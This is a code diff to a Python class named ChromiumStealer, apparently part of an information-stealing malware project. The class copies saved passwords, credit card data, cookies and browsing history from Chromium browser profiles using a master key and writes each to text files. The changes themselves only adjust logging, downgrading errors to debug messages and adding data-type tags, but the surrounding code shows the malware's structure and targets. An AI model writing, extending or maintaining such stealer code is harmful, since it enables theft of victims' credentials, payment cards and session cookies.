@@ -113,21 +113,20 @@ class ChromiumStealer(ModuleManager):
         
         if not os.path.isdir(save_path):
             os.makedirs(save_path)
-            self.mdebug(f"[{browser_name}] [{profile}] Created folder at {save_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [{data_type}] Created folder at {save_path}")
         
         filename = os.path.join(save_path, f'{data_type}.txt')
 
         if content:
             with open(filename, 'w', encoding='utf-8') as file:
                 file.write(content)
-                self.mprint(f"[{browser_name}] [{profile}] Saved content to {filename}")
+                self.mprint(f"[{browser_name}] [{profile}] [{data_type}] Saved content to {filename}")
         else:
-            self.mdebug(f"[{browser_name}] [{profile}] No data found in {data_type}")
+            self.mdebug(f"[{browser_name}] [{profile}] [{data_type}] No data found in {data_type}")
         
         if not os.listdir(save_path):
             os.rmdir(save_path)
-            self.mdebug(f"[{browser_name}] [{profile}] Removing empty folder to due lack of data: {save_path}")
-            self.merror(f"[{browser_name}] [{profile}] No {data_type} found")
+            self.mdebug(f"[{browser_name}] [{profile}] [{data_type}] Removing empty folder as no data was found: {save_path}")
 
 
     def __get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
@@ -136,7 +135,7 @@ class ChromiumStealer(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
 
         if not os.path.exists(login_db):
-            self.merror(f"[{browser_name}] [{profile}] [passwords] Login data doesn't exist at {login_db}")
+            self.mdebug(f"[{browser_name}] [{profile}] [passwords] Login data doesn't exist at {login_db}")
             return
         
         if not os.path.isdir(copy_path):
@@ -180,7 +179,7 @@ class ChromiumStealer(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
         
         if not os.path.exists(cards_db):
-            self.merror(f"[{browser_name}] [{profile}] [cards] Web data doesn't exist at {cards_db}")
+            self.mdebug(f"[{browser_name}] [{profile}] [cards] Web data doesn't exist at {cards_db}")
             return
         
         if not os.path.isdir(copy_path):
@@ -226,7 +225,7 @@ class ChromiumStealer(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
         
         if not os.path.exists(cookie_db):
-            self.merror(f"[{browser_name}] [{profile}] [cookies] Login data doesn't exist at {cookie_db}")
+            self.mdebug(f"[{browser_name}] [{profile}] [cookies] Login data doesn't exist at {cookie_db}")
             return
         
         if not os.path.isdir(copy_path):
@@ -274,7 +273,7 @@ class ChromiumStealer(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
         
         if not os.path.exists(web_history_db):
-            self.merror(f"[{browser_name}] [{profile}] [history] Login data doesn't exist at {web_history_db}")
+            self.mdebug(f"[{browser_name}] [{profile}] [history] Hisory data doesn't exist at {web_history_db}")
             return
         
         if not os.path.isdir(copy_path):
